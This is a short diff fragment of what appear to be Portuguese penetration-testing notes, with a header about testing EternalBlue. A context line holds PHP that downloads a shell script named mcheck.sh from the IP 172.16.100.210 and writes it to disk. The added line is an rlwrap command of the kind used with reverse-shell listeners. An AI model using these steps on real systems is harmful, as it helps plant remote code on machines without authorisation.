@@ -41,6 +41,8 @@ maneira de testar eternal blue
 file_put_contents("mcheck.sh", fopen("172.16.100.210/mcheck.sh", 'r'));
 
 
+rlwrap -a >> garantir
+
 
 
 
